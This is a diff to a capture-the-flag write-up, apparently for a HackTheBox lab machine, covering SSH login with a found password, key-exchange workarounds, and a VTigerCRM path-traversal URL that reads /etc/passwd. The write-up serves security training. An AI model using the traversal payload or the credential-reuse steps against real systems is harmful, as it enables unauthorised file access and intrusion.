@@ -803,30 +803,18 @@ We see a username `admin`, and a common password, `jEhdIekWmdjE`. Since we saw P
 ## 8. SSH (Port 22) with Credentials Found, Getting Flags
 Upon getting password `jEhdIekWmdjE`, we can attempt to SSH into the system.
 ```
-CHANGE THIS
-
-hippoeug@kali:~$ ssh admin@10.10.10.7 <- CHECK!!!!!!!!!!!!!!!!!!!!
+hippoeug@kali:~$ ssh admin@10.10.10.7
 Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
 ```
 
 Ah, let's fix this key exchange method by specifying `diffie-hellman-group1-sha1`.
 ```
-CHANGE THIS
-
-hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7 <- CHECK!!!!!!!!
-The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
-RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts. <- CHECK!!!
-```
-
-We're getting some wrong credentials error <- CHECK!!!
-```
+hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7
+admin@10.10.10.7's password: 
 Permission denied, please try again.
-root@10.10.10.7's password: 
 ```
 
-Maybe we are not using a valid username. Let's use the VTigerCRM exploit we used earlier to get the `etc/passwd` file to find the users.
+We're getting some permission denied errors despite the correct password. Maybe it's the username that's wrong. Let's use the VTigerCRM exploit we used earlier to get the `etc/passwd` file to find the users.
 
 Upon navigating to `(view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action)` on our web browser, we see some usernames indeed.
 ```
@@ -892,3 +880,5 @@ anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  pos
 [root@beep fanis]# cat user.txt
 798c7c7c1711198d3120ec639be0a321
 ```
+
+Interestingly, we were also able to log into https://10.10.10.7:10000/ with the same credentials, `root` and `jEhdIekWmdjE`.
